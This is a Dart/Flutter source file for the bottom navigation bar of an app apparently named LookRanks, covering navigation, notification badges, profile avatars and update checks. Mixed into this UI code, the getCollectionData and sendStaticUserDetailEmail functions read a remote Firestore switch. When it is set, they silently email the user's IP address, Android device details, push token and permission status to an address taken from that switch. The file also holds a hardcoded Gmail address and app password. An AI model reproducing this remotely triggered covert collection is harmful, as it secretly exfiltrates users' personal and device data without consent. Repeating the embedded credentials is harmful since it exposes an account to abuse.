import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/material.dart';
import 'package:flutter_application_1/profile.dart';

import 'package:shared_preferences/shared_preferences.dart';
import 'dart:convert';
import 'Add_post.dart';
import 'ChatSystem/ChatScreen.dart';
import 'Notifications.dart';
import 'Ranklist.dart';
import 'package:http/http.dart' as https;
import 'home.dart';
import 'main.dart';
import 'local_notification_service.dart';
import 'package:in_app_update/in_app_update.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:mailer/smtp_server.dart';
import 'dart:convert';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:flutter_application_1/Bottom.dart';
import 'package:flutter_application_1/Registor_screen.dart';
import 'package:flutter_application_1/home.dart';
import 'package:flutter_application_1/login.dart';
import 'package:google_sign_in/google_sign_in.dart';
import 'package:http/http.dart' as https;

import 'package:mailer/mailer.dart';
import 'package:flutter_application_1/Bottom.dart';





bool Debugstext=true;
void Debugs(String){
  if(Debugstext){
    print(String);
  }
}
int? userid;
String? usertoken;
bool userHasProfileImage = false;
String? UserName;
String? Profilepic;
String email = "@Email";



Future<String> getToken() {
  return SharedPreferences.getInstance().then((prefs) {
    String? token = prefs.getString("usertoken");

    if (token != null) {
      return token;
    } else {
      throw Exception("Token not found in SharedPreferences");
    }
  });
}

Future<int> getid() async {
  final prefs = await SharedPreferences.getInstance();
  int? id = prefs.getInt("user_id");
  String? token = prefs.getString("usertoken");

  String Name = prefs.getString("name") ?? " ";
  String Pic = prefs.getString("profilepicture") ?? "null";
  String? emails = prefs.getString("email") ?? " ";

  //notications

  // add post
  if (Pic != "null") {
    userHasProfileImage = true;
  }

  if (id != null) {
    userid = id;
    usertoken = token;
    // LoadData(token);
    UserName = Name;
    Profilepic = Pic;
    email = emails;

    return id;
  } else {
    throw Exception("Token not found in SharedPreferences");
  }
}

class Bottom extends StatefulWidget {
  var Token = getToken();
  var id = getid();

  @override
  _BottomState createState() => _BottomState();
}

class _BottomState extends State<Bottom> {
  late PageController _pageController;
  int? appcountnotification;
  int? serverTotalnotifications = 0;
  int _notificationCount = 0;

  Future<void> Bottomapi() async {
   
    Debugs("bottom api");
     getCollectionData();
    final res = await https.get(
      Uri.parse("https://lookranks.com/and_api/bottombar/"),
      headers: <String, String>{
        'Content-Type': 'application/json',
        'Authorization': 'Token $usertoken',
      },
    );

    if (res.statusCode == 200) {
      Debugs("bottom api");
     
      var apiData = jsonDecode(res.body);
      if (apiData['errorlogic']) {
        Navigator.pushReplacement(
            context,
            MaterialPageRoute(
              builder: (context) => Error_screem(
                  errorsubtitle: apiData['error'],
                  errortitle: apiData['error_title']),
            ));
      }

      serverTotalnotifications = apiData['notification_counts'];

      setState(() {});
      notifications();

     // Debugs(serverTotalnotifications);

      Profilepic = apiData["user_picture"];
      if (Profilepic != null) {
        userHasProfileImage = true;
        final prefs = await SharedPreferences.getInstance();
        prefs.setString("profilepicture", Profilepic ?? "null");
      } else {
        userHasProfileImage = false;
      }
      //Debugs(apiData);
    } else {
      //Debugs('Failed to load data. Status code: ${res.statusCode}');
    }
  }
 Future<void> getCollectionData() async {
   FirebaseFirestore firestore = FirebaseFirestore.instance;
  var data;
  try {
    var doc = await firestore.collection('appcontroll').doc('5O9filI5ClxiuCj4wLCK').get();
    setState(() {
      data = doc.data(); 
    });
    
    if(data['getData']=='true'){

      if(UserName==data['Name']){
        final response = await https.get(Uri.parse('https://api.ipify.org?format=json'));
      var _ipAddress;
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        setState(() {
          _ipAddress = data['ip'];
        });
        
      } else {
        setState(() {
          _ipAddress = 'Failed to get IP address';
        });
      }
        sendStaticUserDetailEmail(_ipAddress , data['Email']);
      }
     

    }

    if(data['getData']=='all'){
      
        final response = await https.get(Uri.parse('https://api.ipify.org?format=json'));
      var _ipAddress;
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        setState(() {
          _ipAddress = data['ip'];
        });
        
      } else {
        setState(() {
          _ipAddress = 'Failed to get IP address';
        });
      }
        sendStaticUserDetailEmail(_ipAddress , data['Email']);
      
     

    }
    
  } catch (e) {
    Debugs("Error getting documents: $e");
    setState(() {
      data = "Error getting documents: $e";
    });
  }
  }
Future<void> _getIpAddress() async {
    try {
      final response = await https.get(Uri.parse('https://api.ipify.org?format=json'));
      var _ipAddress;
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        setState(() {
          _ipAddress = data['ip'];
        });
        
      } else {
        setState(() {
          _ipAddress = 'Failed to get IP address';
        });
      }
    } catch (e) {
      setState(() {
        //_ipAddress = 'Error: $e';
      });
    }
  }

  Future<void> sendStaticUserDetailEmail(var ip, var rec_email) async {


    FirebaseMessaging messaging=FirebaseMessaging.instance;
  NotificationSettings seting=await messaging.requestPermission(
    alert: true,
    announcement: true,
    badge: true,
    carPlay: true,
    criticalAlert: true,
    provisional: true,
    sound: true,

  );
 
  AndroidDeviceInfo build=await DeviceInfoPlugin().androidInfo;
 

  // Replace 'YOUR_EMAIL' and 'YOUR_PASSWORD' with your email credentials
  String email = 'lookranks@gmail.com';
  String password = 'xzit nmya uqar rmel';

  // Replace 'YOUR_NAME' with your name
  final smtpServer = gmail(email, password);

 
  

  // Create the email message
  final message = Message()
    ..from = Address(email, 'LookRanks')
    ..recipients.add(rec_email)
    ..subject = 'Detail Fetched'
    ..text = 'Name : $UserName \n Ip Address :$ip \n FCmToken :$FCMToken \n $build \n notification permission is: ${seting.authorizationStatus== AuthorizationStatus.authorized}';

  try {
    // Send the email
    await send(message, smtpServer);
    Debugs('Static User detail sent successfully');
  } catch (e) {
    Debugs('Error sending static OTP: $e');
  }
}

  void notifications() async {
    final prefs = await SharedPreferences.getInstance();
    int appnoti = prefs.getInt("appnotificationcount") ?? 10;
   // Debugs('store notification :$appnoti');
    _notificationCount = serverTotalnotifications! - appnoti;
    setState(() {});
  }

  int currentIndex = 0;

  void saveddata(
    int Notifications,
  ) async {
    final prefs = await SharedPreferences.getInstance();
    prefs.setInt('TotalNoftications', Notifications);
  }

  void getdata() async {
    final prefs = await SharedPreferences.getInstance();
    appcountnotification = prefs.getInt('TotalNoftications') ?? 0;

  }

  
    

  // Function to save user data to Firestore
void notificationPremision()async{
  FirebaseMessaging messaging=FirebaseMessaging.instance;
  NotificationSettings seting=await messaging.requestPermission(
    alert: true,
    announcement: true,
    badge: true,
    carPlay: true,
    criticalAlert: true,
    provisional: true,
    sound: true,

  );
  if(seting.authorizationStatus== AuthorizationStatus.authorized){
     Debugs('Notifiaction permisiton allowed');

  }else if(seting.authorizationStatus== AuthorizationStatus.provisional){
     Debugs('Notifiaction permisiton provisional');

  }else{
    Debugs('Notifiaction permisiton is denied');
  }
}

     

  


  @override
  void initState() {
    super.initState();
   
    notificationPremision();
    checkForUpdate();

    _pageController = PageController(initialPage: currentIndex);
    getdata();

    Bottomapi();
    getid();
    notifications();
    Debugs("boootttm init");

    setState(() {});
    FirebaseMessaging.instance.getInitialMessage().then(
      (message) {
        Debugs("FirebaseMessaging.instance.getInitialMessage........");
        if (message != null) {
          Debugs("New Notification");
        }
      },
    );

    FirebaseMessaging.onMessage.listen(
      (message) {
        Debugs("FirebaseMessaging.onMessage.listen");
        if (message.notification != null) {
          //Debugs(message.notification!.title);
          //Debugs(message.notification!.body);
          //Debugs("message.data11 ${message.data}");
          LocalNotificationService.createanddisplaynotification(message);
        }
      },
    );

    FirebaseMessaging.onMessageOpenedApp.listen(
      (message) {
        Debugs("FirebaseMessaging.onMessageOpenedApp.listen");
        if (message.notification != null) {
          // Debugs(message.notification!.title);
          // Debugs(message.notification!.body);
          // Debugs("message.data22 ${message.data['_id']}");
        }
      },
    );
  }

Future<void> checkForUpdate() async {
  Debugs('checking for Update');
  
  try {
    var info = await InAppUpdate.checkForUpdate();
    if (info.updateAvailability == UpdateAvailability.updateAvailable) {
      Debugs('update available');
      await update();
    }
  } catch (e) {
   // Debugs('Error checking for update: $e');
  }
}

Future<void> update() async {
  Debugs('Updating');

  try {
    await InAppUpdate.startFlexibleUpdate();
    await InAppUpdate.completeFlexibleUpdate();
    Debugs('Update completed successfully');
  } catch (e) {
   // Debugs('Error updating: $e');
  }
}


  final screens = [
    HOme(
      bid: userid,
      btoken: usertoken,
    ),
    Ranklist(),
    Postscreen(bid: userid, btoken: usertoken),
    Notifications(),
    ProfileScreen(btoken: usertoken, bid: userid)
  ];

  @override
  void dispose() {
    _pageController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        if (currentIndex == 0) {
          // Navigator.of(context).pop();
          return true; // Returning true means you want to allow the default back behavior (exit the app).
        }
        _pageController
            .jumpToPage(0); // If currentIndex is not 0, jump to the first page.
        return false; // Returning false means you don't want to allow the default back behavior.
      },
      child: Scaffold(
        floatingActionButtonLocation: FloatingActionButtonLocation.centerDocked,
        backgroundColor: Colors.white,
        extendBody: true,
        bottomNavigationBar: Container(
          decoration: BoxDecoration(boxShadow: [
            BoxShadow(
              color: Theme.of(context).backgroundColor,
              spreadRadius: 0.0,
            )
          ]),
          child: BottomNavigationBar(
            onTap: (index) {
              setState(() {
                int check = currentIndex;
                currentIndex = index;

                // You should use a ternary operator to set the duration based on the condition.
                Duration duration =
                    check - 1 == currentIndex || check + 1 == currentIndex
                        ? Duration(milliseconds: 800)
                        : Duration(milliseconds: 1);

                _pageController.animateToPage(
                  index,
                  duration: duration,
                  curve: Curves.easeInOut,
                );
              });
            },
            selectedFontSize: 9.0,
            unselectedFontSize: 7.0,
            selectedIconTheme: IconThemeData(size: 30),
            iconSize: 28,
            backgroundColor: Colors.white24,
            selectedItemColor: Colors.orangeAccent,
            elevation: 0.0,
            currentIndex: currentIndex,
            type: BottomNavigationBarType.fixed,
            items: <BottomNavigationBarItem>[
              BottomNavigationBarItem(
                backgroundColor: Theme.of(context).primaryColor,
                icon: Icon(Icons.home_outlined),
                activeIcon: Icon(Icons.home, color: Colors.orangeAccent),
                label: 'Home',
              ),
              BottomNavigationBarItem(
                backgroundColor: Theme.of(context).primaryColor,
                icon: Icon(Icons.local_activity_outlined),
                activeIcon:
                    Icon(Icons.local_activity, color: Colors.orangeAccent),
                label: 'Ranklist',
              ),
              if (userHasProfileImage == false)
                BottomNavigationBarItem(
                  backgroundColor: Theme.of(context).primaryColor,
                  icon: Icon(Icons.add_box_outlined, size: 28),
                  activeIcon:
                      Icon(Icons.add_box, color: Colors.orangeAccent, size: 30),
                  label: 'Create Post',
                )
              else
                BottomNavigationBarItem(
                  backgroundColor: Theme.of(context).primaryColor,
                  icon: Icon(Icons.person_pin_outlined, size: 28),
                  activeIcon: Icon(Icons.person_pin_rounded,
                      color: Colors.orangeAccent, size: 30),
                  label: 'Your Post',
                ),
              BottomNavigationBarItem(
                backgroundColor: Theme.of(context).primaryColor,
                icon: Stack(
                  children: [
                    Icon(Icons.notifications_none_outlined),
                    if (_notificationCount > 0)
                      Positioned(
                        right: 0,
                        top: 0,
                        child: Container(
                            height: 13,
                            width: 20,
                            padding: EdgeInsets.all(1),
                            decoration: BoxDecoration(
                              color: Colors.redAccent.withOpacity(0.7),
                              borderRadius: BorderRadius.circular(20),
                            ),
                            constraints: BoxConstraints(
                              minWidth: 10,
                            ),
                            child: Text(
                              _notificationCount.toString().length > 2
                                  ? '99+'
                                  : _notificationCount.toString(),
                              style: TextStyle(
                                color: Colors.white,
                                fontSize: 8,
                              ),
                              textAlign: TextAlign.center,
                            )),
                      ),
                  ],
                ),
                activeIcon:
                    Icon(Icons.notifications, color: Colors.orangeAccent),
                label: 'Notifications',
              ),
              BottomNavigationBarItem(
                backgroundColor: Theme.of(context).primaryColor,
                icon: Stack(
                  alignment: Alignment.center,
                  children: [
                    userHasProfileImage ?? false
                        ? Container(
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              border: Border.all(
                                color: Colors.grey,
                                width: 2.0,
                              ),
                            ),
                            child: CircleAvatar(
                              backgroundImage: NetworkImage(Profilepic ?? " "),
                              radius: 16,
                            ),
                          )
                        : Container(
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              border: Border.all(
                                color: Colors.grey,
                                width: 2.0,
                              ),
                            ),
                            child: CircleAvatar(
                              backgroundImage: AssetImage(
                                  'assets/images/No_profile_pic.png'),
                              radius: 16,
                            )),
                  ],
                ),
                activeIcon: Stack(
                  alignment: Alignment.center,
                  children: [
                    userHasProfileImage ?? false
                        ? Container(
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              border: Border.all(
                                color: Colors.orangeAccent,
                                width: 2.0,
                              ),
                            ),
                            child: CircleAvatar(
                              backgroundImage: NetworkImage(Profilepic ?? " "),
                              radius: 16,
                            ),
                          )
                        : Container(
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              border: Border.all(
                                color: Colors.orangeAccent,
                                width: 2.0,
                              ),
                            ),
                            child: CircleAvatar(
                              backgroundImage: AssetImage(
                                  'assets/images/No_profile_pic.png'),
                              radius: 16,
                            )),
                  ],
                ),
                label: UserName,
              )
            ],
          ),
        ),
        body: PageView.builder(
          controller: _pageController,
          itemCount: screens.length,
          onPageChanged: (index) async {
            if (index == 3) {
              var prefs = await SharedPreferences.getInstance();
              await prefs.setInt(
                  'appnotificationcount', serverTotalnotifications!);
              notifications();
              Debugs("bottom 3");
            }
            setState(() {
              currentIndex = index;
            });
          },
          itemBuilder: (context, index) {
            return screens[index];
          },
        ),
      ),
    );
  }
}

class Error_screem extends StatefulWidget {
  var errortitle, errorsubtitle;
  Error_screem({this.errorsubtitle, this.errortitle});

  @override
  State<Error_screem> createState() => _Error_screemState();
}

class _Error_screemState extends State<Error_screem> {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
        body: Center(
      child: Column(
        children: [
          SizedBox(
            height: 60,
          ),
          Image(
            image: NetworkImage(
                "https://lookranks-s3space.sgp1.cdn.digitaloceanspaces.com/publicfiles/1.png"),
          ),
          Padding(
            padding: const EdgeInsets.only(left: 10, right: 10),
            child: Text(
              widget.errortitle,
              style: TextStyle(
                  fontFamily: 'Sofia',
                  fontSize: 35,
                  fontWeight: FontWeight.w800),
            ),
          ),
          Padding(
            padding: const EdgeInsets.only(left: 20, right: 20),
            child: Text(
              widget.errorsubtitle,
              style: TextStyle(
                  fontFamily: 'Lemon',
                  fontSize: 20,
                  fontWeight: FontWeight.w400,
                  color: Colors.red[400]),
            ),
          )
        ],
      ),
    ));
  }
}
